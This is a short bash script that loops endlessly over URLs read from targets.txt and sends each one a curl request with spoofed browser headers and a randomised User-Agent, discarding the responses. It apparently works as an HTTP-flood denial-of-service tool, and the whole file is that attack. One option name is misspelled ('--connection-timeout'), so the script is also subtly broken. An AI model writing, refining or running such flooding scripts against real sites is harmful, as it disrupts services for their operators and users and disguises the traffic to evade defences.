#!/bin/bash

while true; do
	for T in $(cat targets.txt); do
		curl -sLk \
             --connection-timeout 3 \
             -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$((90 + $RANDOM % 9)).0.$(($RANDOM % 4666)).$(($RANDOM % 200)) Safari/537.36" \
             -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
             -H 'accept-encoding: gzip, deflate, br' \
             -H 'accept-language: en-US,en;q=0.9,uk-UA;q=0.8,uk;q=0.7,ru-RU;q=0.6,ru;q=0.5' \
             -H 'cache-control: no-cache' \
             -H 'pragma: no-cache' \
             "$T" > /dev/null;
	done
done
exit 0
